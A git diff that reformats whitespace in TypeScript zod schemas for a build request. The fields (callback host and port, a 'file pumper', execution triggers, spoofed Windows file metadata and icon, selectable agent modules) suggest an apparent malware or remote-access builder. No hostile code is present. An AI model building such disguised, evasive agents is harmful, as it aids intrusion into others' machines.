@@ -1,9 +1,9 @@
 import { z } from 'zod';
 import { agentModuleIds } from '../../../../shared/modules/index.js';
 import {
-        TARGET_OS_VALUES,
-        type BuildRequest,
-        type BuildResponse
+	TARGET_OS_VALUES,
+	type BuildRequest,
+	type BuildResponse
 } from '../../../../shared/types/build';
 
 const numericString = z.union([z.string(), z.number()]);
@@ -62,27 +62,25 @@ const fileIconSchema = z
 	.strict();
 
 const windowsFileInformationSchema = z
-        .object({
-                fileDescription: z.string().optional(),
-                productName: z.string().optional(),
-                companyName: z.string().optional(),
+	.object({
+		fileDescription: z.string().optional(),
+		productName: z.string().optional(),
+		companyName: z.string().optional(),
 		productVersion: z.string().optional(),
 		fileVersion: z.string().optional(),
 		originalFilename: z.string().optional(),
 		internalName: z.string().optional(),
 		legalCopyright: z.string().optional()
-        })
-        .strict();
+	})
+	.strict();
 
-const moduleIdSchema = z
-        .string()
-        .refine((value) => agentModuleIds.has(value), {
-                message: 'Invalid module selection'
-        });
+const moduleIdSchema = z.string().refine((value) => agentModuleIds.has(value), {
+	message: 'Invalid module selection'
+});
 
 export const buildRequestSchema = z
-        .object({
-                host: z.union([z.string(), z.number()]),
+	.object({
+		host: z.union([z.string(), z.number()]),
 		port: numericString.optional(),
 		outputFilename: z.string().optional(),
 		outputExtension: z.string().optional(),
@@ -102,13 +100,13 @@ export const buildRequestSchema = z
 		filePumper: filePumperSchema.optional(),
 		executionTriggers: executionTriggersSchema.optional(),
 		customHeaders: z.array(customHeaderSchema).optional(),
-                customCookies: z.array(customCookieSchema).optional(),
-                audio: audioOptionsSchema.optional(),
-                fileIcon: fileIconSchema.optional(),
-                fileInformation: windowsFileInformationSchema.optional(),
-                modules: z.array(moduleIdSchema).optional()
-        })
-        .strict() satisfies z.ZodType<BuildRequest>;
+		customCookies: z.array(customCookieSchema).optional(),
+		audio: audioOptionsSchema.optional(),
+		fileIcon: fileIconSchema.optional(),
+		fileInformation: windowsFileInformationSchema.optional(),
+		modules: z.array(moduleIdSchema).optional()
+	})
+	.strict() satisfies z.ZodType<BuildRequest>;
 
 export const buildResponseSchema = z
 	.object({
